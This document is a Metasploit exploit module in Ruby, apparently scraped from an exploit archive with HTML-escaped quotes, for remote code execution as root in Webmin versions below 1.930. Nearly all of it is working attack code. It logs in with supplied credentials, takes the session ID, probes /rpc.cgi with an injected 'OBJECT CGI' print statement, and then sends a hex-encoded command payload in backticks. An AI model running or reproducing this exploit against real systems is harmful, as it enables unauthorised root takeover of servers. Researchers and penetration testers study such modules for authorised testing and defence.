# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Webmin < 1.930 Remote Code Execution",
      &#039;Description&#039;    => %q{
      This exploit takes advantage of a code execution issue within the function 
      unserialise_variable() located in web-lib-funcs.pl, in order to gain root.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;James Bercegay&#039;, # Vulnerability Discovery
        ],
      &#039;References&#039;     =>
        [
          [ &#039;URL&#039;, &#039;https://www.gulftech.org/&#039; ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true
        },
      &#039;Platform&#039;       => [&#039;unix&#039;],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        => [ [&#039;Automatic&#039;, {}] ],
      &#039;DisclosureDate&#039; => &#039;2019/08/30&#039;,
      &#039;DefaultTarget&#039;  => 0))

      register_options(
      [
        OptString.new(&#039;WMPORT&#039;,   [ true,  "Webmin port",     &#039;10000&#039;]),
        OptString.new(&#039;WMUSER&#039;,   [ true,  "Webmin username", &#039;test&#039;]),
        OptString.new(&#039;WMPASS&#039;,   [ true,  "Webmin password", &#039;test&#039;]),
      ])
  end

  def check
      
    # Set Webmin port
    datastore[&#039;RPORT&#039;] = datastore[&#039;WMPORT&#039;]

    # Verbose
    print_status("Attempting to login")

    # Send login request
    res = send_request_cgi(
      {
        &#039;uri&#039;       =>  &#039;/session_login.cgi&#039;,
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;vars_post&#039; =>
          {
            &#039;user&#039; => datastore[&#039;WMUSER&#039;],
            &#039;pass&#039; => datastore[&#039;WMPASS&#039;],
            &#039;save&#039; => &#039;1&#039;
          },
        &#039;cookie&#039; => "redirect=1; testing=1; sessiontest=1;"
      })

    # If succesful cookie will be set
    if ( res and res.headers[&#039;Set-Cookie&#039;] )
      # Do we have a valid SID?
      if ( /sid=/.match(res.headers[&#039;Set-Cookie&#039;]) )
        # Extract the SID
        sid = /sid=([a-z0-9]+);/.match(res.headers[&#039;Set-Cookie&#039;])[1]
        print_good("Login was successful")
      else
        # No dice
        print_bad("Unable to login")
        return Exploit::CheckCode::Safe
      end
    else
        # No dice
        print_bad("Unexpected response")
        return Exploit::CheckCode::Safe
    end

    # Verbose
    print_status("Checking if host is vulnerable")

    # Try to execute arbitrary code
    res = send_request_cgi({
        &#039;uri&#039;          => &#039;/rpc.cgi&#039;,
        &#039;method&#039;       => &#039;POST&#039;,
        &#039;headers&#039;      => 
        {
          &#039;Referer&#039; => &#039;http://&#039; + datastore[&#039;RHOST&#039;] + &#039;:&#039; + datastore[&#039;RPORT&#039;].to_s
        },
        &#039;data&#039;   => &#039;OBJECT CGI;print "Content-Type: text/metasploit\n\n"&#039;,
        &#039;cookie&#039; => &#039;redirect=1; testing=1; sessiontest=1; sid=&#039; + sid
      })

    # If it works our custom Content-Type will be set
    if ( res.headers[&#039;Content-Type&#039;] and res.headers[&#039;Content-Type&#039;] == "text/metasploit" )
      # Good
      return Exploit::CheckCode::Vulnerable
    else
      # Bad
      return Exploit::CheckCode::Safe
    end
  end

  def exploit

    # Set Webmin port
    datastore[&#039;RPORT&#039;] = datastore[&#039;WMPORT&#039;]

    # Verbose
    print_status("Attempting to login")

    # Send login request
    res = send_request_cgi(
      {
        &#039;uri&#039;       =>  &#039;/session_login.cgi&#039;,
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;vars_post&#039; =>
          {
            &#039;user&#039; => datastore[&#039;WMUSER&#039;],
            &#039;pass&#039; => datastore[&#039;WMPASS&#039;],
            &#039;save&#039; => &#039;1&#039;
          },
        &#039;cookie&#039; => "redirect=1; testing=1; sessiontest=1;"
      })

    # If succesful cookie will be set
    if ( res and res.headers[&#039;Set-Cookie&#039;] )
      # Do we have a valid SID?
      if ( /sid=/.match(res.headers[&#039;Set-Cookie&#039;]) )
        # Extract the SID
        sid = /sid=([a-z0-9]+);/.match(res.headers[&#039;Set-Cookie&#039;])[1]
        print_good("Login was successful")
      else
        # No dice
        print_bad("Unable to login")
        return
      end
    else
        # No dice
        print_bad("Unexpected response")
        return
    end

    # Verbose
    print_status("Sending selected payload")

    hex = &#039;\x&#039; + payload.encoded.scan(/./).map{ |x| x.unpack(&#039;H*&#039;) }.join(&#039;\x&#039;)

    # Send selected payload
    res = send_request_cgi({
        &#039;uri&#039;          => &#039;/rpc.cgi&#039;,
        &#039;method&#039;       => &#039;POST&#039;,
        &#039;headers&#039;      => 
        {
          &#039;Referer&#039; => &#039;https://&#039; + datastore[&#039;RHOST&#039;] + &#039;:&#039; + datastore[&#039;RPORT&#039;].to_s
        },
        &#039;data&#039;   => &#039;OBJECT CGI;`&#039; + hex + &#039;`&#039;,
        &#039;cookie&#039; => &#039;redirect=1; testing=1; sessiontest=1; sid=&#039; + sid
      })
    end
end

